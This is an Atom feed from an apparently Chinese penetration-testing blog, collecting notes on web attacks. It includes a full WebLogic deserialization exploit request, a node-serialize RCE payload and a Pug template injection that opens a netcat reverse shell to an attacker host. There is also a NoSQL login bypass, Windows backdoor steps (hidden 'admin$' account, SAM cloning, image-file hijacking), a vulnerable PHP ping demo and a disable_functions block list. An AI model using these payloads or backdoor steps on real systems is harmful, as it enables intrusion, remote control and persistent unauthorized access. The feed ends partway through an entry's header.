<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Exi1Sh0w&#39;s Blog</title>
  
  
  <link href="//atom.xml" rel="self"/>
  
  <link href="https://www.xiaonaigou.club/"/>
  <updated>2020-02-04T19:28:39.503Z</updated>
  <id>https://www.xiaonaigou.club/</id>
  
  <author>
    <name>Exi1Sh0w</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>upload总结</title>
    <link href="https://www.xiaonaigou.club/2020/02/05/upload%E6%80%BB%E7%BB%93/"/>
    <id>https://www.xiaonaigou.club/2020/02/05/upload%E6%80%BB%E7%BB%93/</id>
    <published>2020-02-04T19:25:55.000Z</published>
    <updated>2020-02-04T19:28:39.503Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收集的一些关于上传的知识点"><a href="#收集的一些关于上传的知识点" class="headerlink" title="收集的一些关于上传的知识点"></a>收集的一些关于上传的知识点</h2><p><img src="/img/upload%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;收集的一些关于上传的知识点&quot;&gt;&lt;a href=&quot;#收集的一些关于上传的知识点&quot; class=&quot;headerlink&quot; title=&quot;收集的一些关于上传的知识点&quot;&gt;&lt;/a&gt;收集的一些关于上传的知识点&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/upload%E7%B
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WebLogic_wls9-async_反序列化漏洞</title>
    <link href="https://www.xiaonaigou.club/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.xiaonaigou.club/2019/04/26/WebLogic-wls9-async-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-04-25T17:18:49.000Z</published>
    <updated>2019-04-25T17:35:10.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波"><a href="#前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波" class="headerlink" title="前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波"></a>前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波</h2><h3 id="测试环境版本："><a href="#测试环境版本：" class="headerlink" title="测试环境版本："></a>测试环境版本：</h3><p>1、OS:Windows Server 2016 Standard x64</p><p>2、Java:1.8.0_211</p><h3 id="影响版本以及背景"><a href="#影响版本以及背景" class="headerlink" title="影响版本以及背景"></a>影响版本以及背景</h3><p>1、主要是影响一下4个版本</p><p>Oracle WebLogic Server10.3.6.0.0<br>Oracle WebLogic Server12.1.3.0.0     &lt; 本次测试的为这个版本<br>Oracle WebLogic Server12.2.1.1.0<br>Oracle WebLogic Server12.2.1.2.0</p><p>2、下载安装其中4个版本的某一个后(当然需要先安装jkd环境)，通过各位大佬的总结，说是只要能够访问/_async/AsyncResponseService就表示有该漏洞(为了验证该说法，我又安装了最相信的版本的weblogic，至少该目录的确无法访问了…)</p><h3 id="测试POC"><a href="#测试POC" class="headerlink" title="测试POC"></a>测试POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_async&#x2F;AsyncResponseService HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.26:7001</span><br><span class="line">Content-Length: 755</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;&#x2F;wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo &quot;hello,world&quot; &gt; c:\a.txt&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Body&gt;&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>由于使用的是windows的操作系统，所以就测试了下往C盘下写入个txt</p><p>ps:在实验的过程中，我本来是想使用命令nc.exe ip port -e cmd.exe的形式返回shell，但不知道为何并没有执行…</p><p>已把nc.exe放入administrator根目录，直接手打测试是可以得到一个返回shell的，不知道是啥原因</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波&quot;&gt;&lt;a href=&quot;#前两天在网上看到weblogic又又又爆出漏洞，搭建环境测试了一波&quot; class=&quot;headerlink&quot; title=&quot;前两天在网上看到weblogic又又又爆出漏洞，搭建
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Nodejs的一些问题</title>
    <link href="https://www.xiaonaigou.club/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <id>https://www.xiaonaigou.club/2019/04/06/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</id>
    <published>2019-04-06T07:40:10.000Z</published>
    <updated>2020-03-17T14:15:09.435Z</updated>
    
    <content type="html"><![CDATA[<p>通过学习，整理一些基于NodeJS的攻击方式，如有新发现，会持续更新</p><h2 id="一、Node反序列化"><a href="#一、Node反序列化" class="headerlink" title="一、Node反序列化"></a>一、Node反序列化</h2><p>1.通过修改cookie信息 base64编码，需要知道应用的绝对路径<br>2.poc:<br><code>{&quot;thp&quot;:&quot;_$$ND_FUNC$$_function (){require(&#39;child_process&#39;).exec(&#39;这里填写命令&#39;, function(error, stdout, stderr) { console.log(stdout) });}()&quot;}</code></p><h2 id="二、针对pug文件的攻击"><a href="#二、针对pug文件的攻击" class="headerlink" title="二、针对pug文件的攻击"></a>二、针对pug文件的攻击</h2><p>pug文件</p><p>介绍:<a href="http://www.cnblogs.com/xiaohuochai/p/7222227.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaohuochai/p/7222227.html</a></p><h3 id="REC"><a href="#REC" class="headerlink" title="REC"></a>REC</h3><p>1.首先登陆一个有效的账户</p><p>2.poc</p><p><code>-var x = global.process.mainModule.require-x(&#39;child_process&#39;).exec(&#39;nc [Your_IP] 8888 -e /bin/bash&#39;)</code></p><p>在pug中，符号”-“表示执行javascript</p><p>Ps:debian系的linux发行版默认(debian/ubuntu/mint等)安装的都是netcat-openbsd版，没有-e参数</p><p>3.使用burpsuite抓包，获取文件的哈希值以及应用的drouting</p><p><img src="/img/nodejs/haxi.jpg" alt=""></p><p>4.使用NC监听8888端口</p><p>命令:nc -l -p 8888</p><p>5.通过组合，访问该url，使之执行命令</p><p><img src="/img/nodejs/ncshell.jpg" alt=""></p><h2 id="三、应用注入"><a href="#三、应用注入" class="headerlink" title="三、应用注入"></a>三、应用注入</h2><blockquote><p>NoSQL 注入的一个常见例子是注入类似的东西: [{“$gt”:””}] 。这个 JSON 对象基本上是说运算符( $gt )大于 NULL(“”)。由于逻辑上一切都大于 NULL，因此 JSON 对象成为一个真正正确的语句，允许我们绕过或注入 NoSQL 查询。这相当于 SQL 注入世界中的[‘ or 1=1—]。在 MongoDB 中，我们可以使用以下条件运算符之一:</p><p>(&gt;)大于 - $gt </p><p>(&lt;)小于 - $lt </p><p>(&gt;=)大于等于 - $gte </p><p>(&lt;=)小于等于 - $lte</p></blockquote><p><img src="/img/nodejs/inj1.jpg" alt=""></p><p>在将字符串修改为<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;&quot;}}</code>后，因为大于null的内容都为True。所以post请求更改为<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:True}</code>了，类似于一般sql注入中 <code>1=1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通过学习，整理一些基于NodeJS的攻击方式，如有新发现，会持续更新&lt;/p&gt;
&lt;h2 id=&quot;一、Node反序列化&quot;&gt;&lt;a href=&quot;#一、Node反序列化&quot; class=&quot;headerlink&quot; title=&quot;一、Node反序列化&quot;&gt;&lt;/a&gt;一、Node反序列化&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>xss记录</title>
    <link href="https://www.xiaonaigou.club/2019/04/02/xss%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.xiaonaigou.club/2019/04/02/xss%E8%AE%B0%E5%BD%95/</id>
    <published>2019-04-01T16:30:10.000Z</published>
    <updated>2019-04-01T17:05:47.720Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于xss的一点记录"><a href="#关于xss的一点记录" class="headerlink" title="关于xss的一点记录"></a>关于xss的一点记录</h1><h2 id="1-在-Pug-隐藏和非转义字符串插值-https-pugjs-org-language-interpolation-html"><a href="#1-在-Pug-隐藏和非转义字符串插值-https-pugjs-org-language-interpolation-html" class="headerlink" title="1.在 Pug 隐藏和非转义字符串插值( https://pugjs.org/language/interpolation.html ):"></a>1.在 Pug 隐藏和非转义字符串插值( <a href="https://pugjs.org/language/interpolation.html" target="_blank" rel="noopener">https://pugjs.org/language/interpolation.html</a> ):</h2><p>!{} - 非转义字符串插值 </p><p>#{} - 转义字符串插值 * 虽然这是转义的，但如果直接通过 JavaScript 传递它仍然可能容易受到 XSS 的 攻击 </p><p>在 JavaScript 中，未转义的缓冲区代码以“!=”开头。“!=”之后的任何内容都将自动作为 JavaScript 执行。 [http s://pugjs.org/language/code.html#unescaped-buffered-code] </p><p>最后，只要允许插入原始 HTML，就有可能存在 XSS。 </p><h2 id="2-在源码中搜索-，-，-这三个字符，有助于发现XSS"><a href="#2-在源码中搜索-，-，-这三个字符，有助于发现XSS" class="headerlink" title="2.在源码中搜索!{，#{，${这三个字符，有助于发现XSS"></a>2.在源码中搜索!{，#{，${这三个字符，有助于发现XSS</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关于xss的一点记录&quot;&gt;&lt;a href=&quot;#关于xss的一点记录&quot; class=&quot;headerlink&quot; title=&quot;关于xss的一点记录&quot;&gt;&lt;/a&gt;关于xss的一点记录&lt;/h1&gt;&lt;h2 id=&quot;1-在-Pug-隐藏和非转义字符串插值-https-pugjs-o
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://www.xiaonaigou.club/2019/03/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.xiaonaigou.club/2019/03/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-03-15T05:59:16.000Z</published>
    <updated>2019-03-15T06:00:21.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="注册场景"><a href="#注册场景" class="headerlink" title="注册场景"></a>注册场景</h2><h3 id="批量注册"><a href="#批量注册" class="headerlink" title="批量注册"></a>批量注册</h3><ul><li>手机墙真人操作；</li><li>脚本批量注册；</li><li>模拟器注册；</li></ul><h3 id="任意账号注册"><a href="#任意账号注册" class="headerlink" title="任意账号注册"></a>任意账号注册</h3><ul><li>用户信息与校验凭证未绑定；</li><li>不校验用户信息（只需要收入手机号或邮箱即可注册成功）；</li></ul><h3 id="洗号"><a href="#洗号" class="headerlink" title="洗号"></a>洗号</h3><ul><li>通过判断用户是否已注册接口来从海量用户中筛选出有效用户；</li></ul><h3 id="注册覆盖"><a href="#注册覆盖" class="headerlink" title="注册覆盖"></a>注册覆盖</h3><p><strong>低版本的MySQL可以复现</strong></p><p>账户A：zhangsan</p><p>账户B：zhangsan (张三后面有N个空格)</p><h2 id="登录场景"><a href="#登录场景" class="headerlink" title="登录场景"></a>登录场景</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ul><li>不存在任何安全防护措施的情况下任意爆破；</li><li>存在验证码：验证码逻辑漏洞；</li></ul><h3 id="恶意锁定"><a href="#恶意锁定" class="headerlink" title="恶意锁定"></a>恶意锁定</h3><ul><li>当账户登录错误次数达到限制后，锁定账户N小时不允许登录；</li></ul><h3 id="session安全问题"><a href="#session安全问题" class="headerlink" title="session安全问题"></a>session安全问题</h3><ul><li>session会话固定：每次登录都是相同的session；</li><li>session会话注销：用户退出时不注销用户的session；</li><li>session会话超时：session存活时间过长；</li></ul><h3 id="cookie仿冒"><a href="#cookie仿冒" class="headerlink" title="cookie仿冒"></a>cookie仿冒</h3><ul><li>cookie结构太过简单，容易被猜测从而导致用户恶意构造，此攻击需要后端不记录用户cookie有效；</li></ul><h3 id="登录提示问题"><a href="#登录提示问题" class="headerlink" title="登录提示问题"></a>登录提示问题</h3><ul><li>洗号：通过判断账号是否存在接口或通过提示信息来从海量用户中筛选出有效用户；</li></ul><h3 id="未加密登录传输请求"><a href="#未加密登录传输请求" class="headerlink" title="未加密登录传输请求"></a>未加密登录传输请求</h3><ul><li>网络监听与劫持</li></ul><h2 id="找回密码场景"><a href="#找回密码场景" class="headerlink" title="找回密码场景"></a>找回密码场景</h2><p>正常找回密码的4步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.输入用户信息</span><br><span class="line">b.用户凭证校验</span><br><span class="line">c.重置密码</span><br><span class="line">d.重置成功</span><br></pre></td></tr></table></figure><h3 id="认证凭证暴力破解"><a href="#认证凭证暴力破解" class="headerlink" title="认证凭证暴力破解"></a>认证凭证暴力破解</h3><p>在第二步用户凭证校验的过程中，由于凭证过于简单（4位数字）或者失效时间较长、不失效等问题导致攻击者可以进行暴力破解凭证。</p><p>常用工具：Burpsuite-Intruder</p><h3 id="凭证返回错误"><a href="#凭证返回错误" class="headerlink" title="凭证返回错误"></a>凭证返回错误</h3><p>凭证返回在response的header、body中导致可以直接获取凭证。</p><h3 id="凭证与用户信息不绑定"><a href="#凭证与用户信息不绑定" class="headerlink" title="凭证与用户信息不绑定"></a>凭证与用户信息不绑定</h3><p>在第二步凭证校验中，由于凭证没有与用户的手机或邮箱进行绑定，导致可以用B用户的凭证来校验A用户，导致密码被恶意重置。</p><h3 id="邮箱弱Token"><a href="#邮箱弱Token" class="headerlink" title="邮箱弱Token"></a>邮箱弱Token</h3><p>常常出现在邮箱找回密码中，Token生成的方式常见有如下几种：</p><ul><li>Unix时间戳</li><li>用户名、用户名+其他信息</li><li>常见编码或加密：md5、base64等等</li></ul><h3 id="Cookie覆盖"><a href="#Cookie覆盖" class="headerlink" title="Cookie覆盖"></a>Cookie覆盖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用A用户的账号重置到第三步，不要关闭页面；</span><br><span class="line">在同一个浏览器中新开一个页面，用B用户的账号重置到第二步，不要关闭页面；</span><br><span class="line">刷新第一个页面（也就是A用户的重置页面），这个时候就可以重置B用户的密码了；</span><br></pre></td></tr></table></figure><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><ul><li>在第二步凭证校验代码由前端JS或其他语言编写，校验结果可控。</li></ul><h3 id="找回步骤上下文越权"><a href="#找回步骤上下文越权" class="headerlink" title="找回步骤上下文越权"></a>找回步骤上下文越权</h3><ul><li>上下文越权这里指，从第一步直接跳到第三步，从而绕过了用户凭证校验的过程。</li></ul><h3 id="万能校验码"><a href="#万能校验码" class="headerlink" title="万能校验码"></a>万能校验码</h3><ul><li>万能验证码：000000/666666/888888</li></ul><h2 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><ul><li>相同角色间用自己的身份访问他人信息或资源；</li></ul><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><ul><li>不同角色间访问自身不能访问的信息或资源；</li></ul><h2 id="炸弹攻击"><a href="#炸弹攻击" class="headerlink" title="炸弹攻击"></a>炸弹攻击</h2><p>通常出现炸弹攻击的位置如下：（欢迎补充）</p><ul><li>注册用户</li><li>激活用户</li><li>密码找回发送凭证</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;注册场景&quot;&gt;&lt;a href=&quot;#注册场景&quot; class=&quot;headerlink&quot; title=&quot;注册场景&quot;&gt;&lt;/a&gt;注册场景&lt;/h2&gt;&lt;h3 id=&quot;批量注册&quot;&gt;&lt;a href=&quot;#批量注册&quot; class=&quot;headerlink&quot; title=&quot;批量注册&quot;&gt;&lt;/a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>后门归类</title>
    <link href="https://www.xiaonaigou.club/2019/03/06/%E5%90%8E%E9%97%A8%E5%BD%92%E7%B1%BB/"/>
    <id>https://www.xiaonaigou.club/2019/03/06/%E5%90%8E%E9%97%A8%E5%BD%92%E7%B1%BB/</id>
    <published>2019-03-05T20:01:37.000Z</published>
    <updated>2019-12-31T18:41:28.794Z</updated>
    
    <content type="html"><![CDATA[<h1 id="将会不断更新…"><a href="#将会不断更新…" class="headerlink" title="将会不断更新…."></a>将会不断更新….</h1><h1 id="Windows下的"><a href="#Windows下的" class="headerlink" title="Windows下的"></a>Windows下的</h1><h2 id="1-开机启动"><a href="#1-开机启动" class="headerlink" title="1.开机启动"></a>1.开机启动</h2><p>通过修改注册表的”HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p><p>不过这种方式太过脑残，已经是属于非常落后，切容易被发现的方式，并不推荐</p><h2 id="2-创建影子账号"><a href="#2-创建影子账号" class="headerlink" title="2.创建影子账号"></a>2.创建影子账号</h2><p>首先创建一个无法在cmd下看到的账号</p><p>例:net user admin$ test /add </p><p>通过添加“$”符号，使创建的账号无法在cmd下被发现</p><p>然后修改注册表，在SAM键值下把administrator的值(一般为000001F4)复制到所创建的账号值上</p><p><img src="/img/backdoor/sam.png" alt="avatar"></p><p>导出注册表</p><p>删除所创建的影子账号</p><p>双击导出的注册表文件，导入注册表文件</p><h2 id="3-系统自带的AT命令"><a href="#3-系统自带的AT命令" class="headerlink" title="3.系统自带的AT命令"></a>3.系统自带的AT命令</h2><p>就像个定时闹钟，让电脑在规定的时间内执行某些命令，具体命令格式cmd下”at /?”查看</p><h2 id="4-映像劫持"><a href="#4-映像劫持" class="headerlink" title="4.映像劫持"></a>4.映像劫持</h2><p>就是通过修改注册表，修改软件的链接???</p><p>“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options”目录下的iexplore.exe</p><p> <img src="/img/backdoor/yxjc.png" alt="avatar"></p><h2 id="5-Shift后门"><a href="#5-Shift后门" class="headerlink" title="5.Shift后门"></a>5.Shift后门</h2><p>这个也有点年代了…基本老鸟一看就知道有问题</p><h2 id="6-外部工具"><a href="#6-外部工具" class="headerlink" title="6.外部工具"></a>6.外部工具</h2><p>PowerShell后门</p><p>Empire:<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;将会不断更新…&quot;&gt;&lt;a href=&quot;#将会不断更新…&quot; class=&quot;headerlink&quot; title=&quot;将会不断更新….&quot;&gt;&lt;/a&gt;将会不断更新….&lt;/h1&gt;&lt;h1 id=&quot;Windows下的&quot;&gt;&lt;a href=&quot;#Windows下的&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="https://www.xiaonaigou.club/2019/01/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://www.xiaonaigou.club/2019/01/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2019-01-16T08:39:00.000Z</published>
    <updated>2019-01-16T08:48:15.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="在书里看到一个算是小技巧吧"><a href="#在书里看到一个算是小技巧吧" class="headerlink" title="在书里看到一个算是小技巧吧"></a>在书里看到一个算是小技巧吧</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用两个花括号进行特殊构造，使函数能够执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure><p>Demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;简单ping功能&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">        请输入IP:&lt;input name=<span class="string">"ip"</span> type=<span class="string">"text"</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input name=<span class="string">"submit"</span> type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $target = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">    <span class="comment">// 使用php_uname判断是否为Windows系统</span></span><br><span class="line">    <span class="keyword">if</span> (stristr(php_uname(<span class="string">'s'</span>), <span class="string">'Windows NT'</span>))&#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping '</span> .$target);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping -c 3 '</span> .$target);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.禁用部分函数：<br>    打开php.ini,查找到disable_functions,添加需要禁用的函数名：<br>    PHPinfo()/eval()/passthru()/exec()/system()/chroot()/scandir()/chgrp()/chown()/shell_exec()/proc_open()/<br>    proc_get_status()/ini_alter()/ini_restore()/dl()/pfsockopen()/openlog()/syslog()/readlink()/symlink()/<br>    popepassthru()/stream_socket_server()/fsocket()/fsockopen()</p><p>2.过滤关键字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">)</span><br><span class="line">$target = str_replace(array_keys($subtitutions), $subtitutions, $target);</span><br></pre></td></tr></table></figure><p>3.限制参数类型</p><p>​    比如Demo，是一个pingIP的程序，可以限制只能输入数字</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;在书里看到一个算是小技巧吧&quot;&gt;&lt;a href=&quot;#在书里看到一个算是小技巧吧&quot; class=&quot;headerlink&quot; title=&quot;在书里看到一个算是小技巧吧&quot;&gt;&lt;/a&gt;在书里看到一个算是小技巧吧&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传的攻击/防御</title>
    <link href="https://www.xiaonaigou.club/2019/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://www.xiaonaigou.club/2019/01/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2019-01-14T05:55:05.000Z</published>
    <updated>2019-01-14T08:29:29.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传的攻击、防御点"><a href="#文件上传的攻击、防御点" class="headerlink" title="文件上传的攻击、防御点"></a>文件上传的攻击、防御点</h2><p>一个文件上传的过程：用户-客户端提交上传表单-服务器接收上传信息-存储为临时文件-转存为正式文件-调用与执行文件</p><p>在这一系列动作中，基本每个都存在攻击、防御的点</p><h3 id="客户端提交上传表单"><a href="#客户端提交上传表单" class="headerlink" title="客户端提交上传表单"></a>客户端提交上传表单</h3><p>防御：前台使用javascript检测</p><p>攻击：抓包修改文件、浏览器禁用JS</p><h3 id="服务器接收上传文件"><a href="#服务器接收上传文件" class="headerlink" title="服务器接收上传文件"></a>服务器接收上传文件</h3><p>防御：上传信息过滤-MIME检测，文件头检测，文件信息检测，扩展名(黑、白名单)</p><p>攻击：MIME欺骗、文件名截断、解析漏洞、文件头欺骗、黑名单绕过</p><h3 id="存储为临时文件"><a href="#存储为临时文件" class="headerlink" title="存储为临时文件"></a>存储为临时文件</h3><p>防御：文件重命名</p><p>攻击：无</p><h3 id="转存为正式文件"><a href="#转存为正式文件" class="headerlink" title="转存为正式文件"></a>转存为正式文件</h3><p>防御：文件加载检测、图像二次渲染</p><p>攻击：无</p><h3 id="调用与执行文件"><a href="#调用与执行文件" class="headerlink" title="调用与执行文件"></a>调用与执行文件</h3><p>防御：无</p><p>攻击：文件包含、.htaccess文件</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文件上传的攻击、防御点&quot;&gt;&lt;a href=&quot;#文件上传的攻击、防御点&quot; class=&quot;headerlink&quot; title=&quot;文件上传的攻击、防御点&quot;&gt;&lt;/a&gt;文件上传的攻击、防御点&lt;/h2&gt;&lt;p&gt;一个文件上传的过程：用户-客户端提交上传表单-服务器接收上传信息-存
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Markdown编辑器typora_xss</title>
    <link href="https://www.xiaonaigou.club/2019/01/03/Markdown%E7%BC%96%E8%BE%91%E5%99%A8typora_xss/"/>
    <id>https://www.xiaonaigou.club/2019/01/03/Markdown%E7%BC%96%E8%BE%91%E5%99%A8typora_xss/</id>
    <published>2019-01-02T16:00:00.000Z</published>
    <updated>2019-12-31T18:40:42.634Z</updated>
    
